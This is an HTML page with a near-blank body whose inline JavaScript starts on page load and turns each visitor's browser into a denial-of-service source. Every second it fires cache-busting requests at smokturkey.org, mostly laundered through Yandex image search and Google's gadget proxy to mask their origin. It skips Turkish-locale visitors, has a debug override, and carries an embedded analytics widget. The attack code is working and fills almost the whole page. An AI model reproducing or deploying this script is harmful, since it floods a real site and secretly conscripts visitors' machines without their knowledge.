<html>

	<head>

		<meta name="referrer" content="no-referrer" />

	    <script>

		    // https://javascript-obfuscator.org/ (String Array Encoding: base64, Self Defending: true, )

		    var interval = false;

		    var srcns = ["microsoft", "google", "bing", "yandex"];
		    var tdlns = ["com", "ru", "net", "org", "de", "uk"];
		    var kywds = ["images", "documents", "videos", "music"];

	        var rnd = function(length) {
				return Math.random().toString(36).substr(2, length);
	        };

		    var _ysrc = function(target) {
			    return 'https://'+srcns[3]+'.'+tdlns[1]+'/'+kywds[0]+'/search?format=json&url='+encodeURIComponent(target)+'&rpt=imageview';
		    };

		    var _gsrc = function(target) {
			    return 'https://'+kywds[0]+Math.round(Math.random()*10000)+'-focus-opensocial.'+srcns[1]+'usercontent.'+tdlns[0]+'/gadgets/proxy?container=focus&resize_w=25&url='+encodeURIComponent(target);
		    };

	        var doit = function(target, method) {

		        var src = '';

				switch(method) {
				    case 'y':
				        src = _ysrc(target);
				        break;
				    case 'g':
				        src = _gsrc(target);
				        break;
				    default:
				        src = target;
				}

				var img = new Image();

				img.src = src;

	        };

	        var start = function(target, check, methods, seq) {

		        var lang = navigator.language || navigator.userLanguage;

				if(document.location.search.indexOf("ga-debug") == -1 && (lang == "tr-TR" || document.referrer == null || document.referrer.indexOf(window.location.hostname) >= 0))return false;

		        if(check) {

					var img = new Image();

					img.onerror = function() {clearInterval(interval);};

					img.src = check+(check.indexOf('?') > 0 ? '&' : '?')+rnd(7)+'='+rnd(7);

				}

				interval = setInterval(function() {

					doit(target+(target.indexOf('?') > 0 ? '&' : '?')+rnd(7)+'='+rnd(7), methods.split('')[Math.floor(Math.random() * methods.length)]);

				}, seq);

	        };

		</script>

	</head>

	<body onload="start('https://www.smokturkey.org/', false, 'yyyywwg', 1000);">
		<script id="_wauogl">var _wau = _wau || []; _wau.push(["dynamic", "0qpct0aaz0", "ogl", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>	
	</body>

</html>
